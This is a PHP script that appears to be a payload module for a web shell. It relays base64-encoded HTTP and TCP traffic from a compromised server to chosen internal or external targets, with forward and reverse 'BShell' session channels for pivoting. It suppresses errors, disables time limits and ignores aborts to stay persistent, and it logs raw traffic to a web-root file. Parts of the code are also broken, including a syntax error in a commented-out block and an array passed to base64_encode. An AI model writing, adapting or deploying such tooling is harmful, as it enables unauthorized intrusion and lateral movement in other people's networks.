<?
@error_reporting(0);

function main($target, $payloadBody, $type, $effectHeaders, $direction)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $payloadBody=base64_decode($payloadBody);
    
    $result = array();
    if ($type == "TCP") {
        transTCP($direction,$target,$payloadBody);
    } else {
        $effectHeaders=str_replace("|",": ",$effectHeaders);
        transHTTP($target, $payloadBody,$effectHeaders);
    }
}
function transHTTP($target, $payloadBody,$effectHeaders)
{
    $target=parse_url($target);
    $scheme=$target["scheme"];
    $host=$target["host"];
    $path=$target["path"];
    if ($scheme=="http")
    {
        $port=$target["port"];
        if (!isset($port))
        {
           $port=80; 
        }
        $target="tcp://".$host.":".$port;
    }
    else if ($scheme=="https")
    {
        $port=$target["port"];
        if (!isset($port))
        {
           $port=443; 
        }
        $target="ssl://".$host.":".$port;
    }
    else
    {
        return;
    }
    $headers=$_SESSION["transfer_headers_".$target];
    if (!isset($headers))
    {
        @session_start();
        $_SESSION["transfer_headers_".$target]=$effectHeaders;
        $headers=$_SESSION["transfer_headers_".$target];
        @session_write_close();

        /*$effectHeaders=explode("\n",$effectHeaders);
        $headers=array();
        foreach($effectHeaders as $headerLine)
        {
            $headerLine=explode(":",$headerLine);
        }
        $_SESSION[$target]="";*/
    }
    $payloadBody=addHeaders($payloadBody,$path,$host,$headers);
    $socket = stream_socket_client($target, $errno, $errstr);
    $response="";
    $ff=fopen("/var/www/html/req.txt","w");
    fwrite($ff,$payloadBody);
    fclose($ff);
    if ($socket) {
        fwrite($socket, $payloadBody);
        while (!feof($socket)) {
            $response=$response.fgets($socket, 1024);
        }
        $ff=fopen("/var/www/html/req.txt","w");
                    fwrite($ff,$response);
                    fclose($ff);
        $response=explode("\r\n\r\n",$response)[1];

        //$response=expstrpos($response,"\r\n\r\n")
        fclose($socket);
        echo $response;
    }
}
function extractCookie($target,$response)
{
    if (strpos($response,"\r\n\r\n")>=0)
    {
        $responseHeaders=explode("\r\n\r\n",$response);
        $responseHeaders=$responseHeaders[0];
        $cookieStart = stripos($responseHeaders, "set-cookie:");
        if ($cookieStart>=0)
        {
            $cookieStop=stripos($responseHeaders, "\n",$cookieStart);
            $cookie=substr($responseHeaders,$cookieStart,$cookieStop);
            $cookie=trim($cookie);
            $_SESSION["transfer_headers_".$target]=$_SESSION["transfer_headers_".$target].$cookie."\r\n";
        }
    }
}


function addHeaders($payloadBody,$path,$host,$headers)
{
    $requestHeaders="POST %s HTTP/1.0\r\n".
    "Host: %s\r\n".
    //"Accept: application/json, text/javascript, */*; q=0.01\r\n".
    //"Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\r\n".
    //"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0\r\n".
    "%s".
    "Content-Length: %d\r\n\r\n";
    $requestHeaders=sprintf($requestHeaders, $path,$host,$headers,strlen($payloadBody));
    if ($requestHeaders==NULL||$requestHeaders=="")
    {
        return $payloadBody;
    }
    return $requestHeaders.$payloadBody;
}
function transForwardTCP($target,$payloadBody)
{
    $target = explode(":", $target);
    $host = $target[0];
    $port = $target[1];
    $sockObj = getSocket($host, $port);
    $sock = $sockObj["s"];
    $s_type = $sockObj["s_type"];
    if ($s_type == 'error') {
        echo "\x37\x21\x49\x36Failed connecting to target" . $sock;
        return;
    }

    $socketRead = "socket_read";
    $socketWrite = "socket_write";
    $socketClose = "socket_close";
    $socketSelect = "socket_select";
    if ($s_type == 'stream') {
        $socketRead = "fread";
        $socketRead = "fread"; //此处是文本读取，一次一行
        $socketWrite = "fwrite";
        $socketClose = "fclose";
        $socketSelect = "stream_select";
    }
    if ($s_type == 'stream') {
        stream_set_blocking($sock, false);
    } else {
        socket_set_nonblock($sock);
    }
    if ($s_type=='stream')
    {
        stream_set_blocking($sock,false);
    }
    else
    {
        socket_set_nonblock($sock);
    }
    $socketWrite($sock, $payloadBody);
    $buffer="";
    while (strpos($buffer, "\n") === false)
    {
        $buffer .= $socketRead($sock, 1024);
    }
    $socketClose($sock);
    echo trim($buffer);
}
function transTCP($direction,$target,$payloadBody)
{
    if ($direction=="Forward")
    {
        transForwardTCP($target,$payloadBody);
    }
    else if ($direction=="Reverse")
    {
        $reverseBShellSocketHash=sprintf("BShell_Reverse_%s",$target);
        if (isset($_SESSION[$reverseBShellSocketHash])===false)
        {
            $result["status"] = base64_encode("fail");
            $result["msg"] = base64_encode("No Reverse BShell for ".$target);
            echo base64_encode($result);
            return;
        }
        else
        {
            $reverseBShellSocketWriteHash=$reverseBShellSocketHash."_write";
            @session_start();
            $_SESSION[$reverseBShellSocketWriteHash]=$payloadBody;
            @session_write_close();
            $reverseBShellSocketReadHash=$reverseBShellSocketHash."_read";
            while(strpos($response,"\n")===false)
            {
                $response=$response.$_SESSION[$reverseBShellSocketReadHash];
                @session_start();
                $_SESSION[$reverseBShellSocketReadHash]="";
                @session_write_close();
            }
            echo $response;
        }
    }
   
}

function getSocket($ip, $port)
{
    $resultObj = array();
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    }
    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port);
        $s_type = 'stream';
    }
    if (!$s && ($f = 'socket_create') && is_callable($f)) {
        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    }
    if (!$s_type) {
        $s_type = "error";
        $s = 'no socket funcs';
    }
    if (!$s) {
        $s_type = "error";
        $s = 'no socket';
    }
    $resultObj["s"] = $s;
    $resultObj["s_type"] = $s_type;
    return $resultObj;
}

/*function createSocket($target)
{
    $target = explode(":", $target);
    $host = $target[0];
    $port = $target[1];
    $sockObj = getSocket($host, $port);
    $sock = $sockObj["s"];
    $s_type = $sockObj["s_type"];
    if ($s_type == 'error') {
        echo "\x37\x21\x49\x36Failed connecting to target" . $sock;
        return;
    }

    $socketRead = "socket_read";
    $socketWrite = "socket_write";
    $socketClose = "socket_close";
    $socketSelect = "socket_select";
    if ($s_type == 'stream') {
        $socketRead = "fread";
        $socketWrite = "fwrite";
        $socketClose = "fclose";
        $socketSelect = "stream_select";
    }
    if ($s_type == 'stream') {
        stream_set_blocking($sock, false);
    } else {
        socket_set_nonblock($sock);
    }
    if ($s_type=='stream')
    {
        stream_set_blocking($sock,false);
    }
    else
    {
        socket_set_nonblock($sock);
    }
    $BShellSocketHash=sprintf("BShell_Forward_%s",$target);
        @session_start();
        $_SESSION[$BShellSocketHash] = true;
        $_SESSION[$BShellSocketHash."_read"] = "";
        $_SESSION[$BShellSocketHash."_write"] = "";
        session_write_close();

        ob_end_clean();
        header("Connection: close");
        ignore_user_abort();
        ob_start();
        $size = ob_get_length();
        header("Content-Length: $size");
        ob_end_flush();
        flush();

        //fastcgi_finish_request();
        $clients[] = $reverseBShellSocket;
        $read = $clients;

            $write = $clients;

        while ($_SESSION[$BShellSocketHash])
        {
            if (socket_select($read, $write, $exp, null) > 0) {
                foreach ($read as $socket_item) {
                    socket_getpeername($socket_item, $address, $port);
                    $BShellSocketReadHash =  "BShell_Forward_"  .$target."_read";
                    $readContent = "";
                    $content = socket_read($socket_item, 2048);
                    while(strlen($content)>0)
                    {
                        $readContent=$readContent.$content;
                        $content = socket_read($socket_item, 2048);
                    }
                    @session_start();
                    $_SESSION[$BShellSocketReadHash]=$_SESSION[$BShellSocketReadHash].$readContent;
                    session_write_close();
                }
                foreach ($write as $socket_item) {
                    socket_getpeername($socket_item, $address, $port);
                    $BShellSocketWriteHash = "BShell_Forward_".$target"_write";
                    @session_start();
                    $writeContent=$_SESSION[$BShellSocketWriteHash];
                    if (strlen($writeContent)>0)
                    {
                    $count=socket_write($socket_item, $writeContent, strlen($writeContent));
                    }
                    $_SESSION[$BShellSocketWriteHash]="";
                    session_write_close();
                }
            }
            sleep(1);
        }
        $socketClose($sock);
}
*/



